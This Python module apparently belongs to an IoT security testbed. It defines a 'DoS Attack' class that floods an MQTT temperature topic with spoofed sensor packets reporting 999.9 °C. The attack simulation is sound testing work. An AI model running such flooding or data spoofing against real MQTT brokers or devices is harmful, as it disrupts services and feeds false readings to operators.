"""
Denial of Service (DoS) Attack

Purpose:
    Simulates an MQTT flooding attack.
"""

import json
from datetime import datetime

from backend.attacks.attack_config import (
    TEMPERATURE_TOPIC,
    DOS_ATTACK_CLIENT,
    DOS_ATTACK_DURATION,
    DOS_PACKET_INTERVAL,
)

from backend.attacks.base_attack import BaseAttack


class DoSAttack(BaseAttack):
    """MQTT DoS Attack."""

    def __init__(self):
        super().__init__(
            attack_name="DoS Attack",
            client_id=DOS_ATTACK_CLIENT,
            interval=DOS_PACKET_INTERVAL,
            duration=DOS_ATTACK_DURATION,
        )

        self.packet_count = 0

    def execute(self):
        """Publish one malicious MQTT packet."""

        self.packet_count += 1

        payload = {
            "device_id": "fake_temperature_sensor",
            "timestamp": datetime.now().isoformat(),
            "sensor_type": "temperature",
            "value": 999.9,
            "unit": "°C",
            "status": "DOS",
        }

        self.publisher.publish(
            TEMPERATURE_TOPIC,
            payload,
        )

        self.logger.info(
            f"Packet #{self.packet_count} → {TEMPERATURE_TOPIC}"
        )


if __name__ == "__main__":
    attack = DoSAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()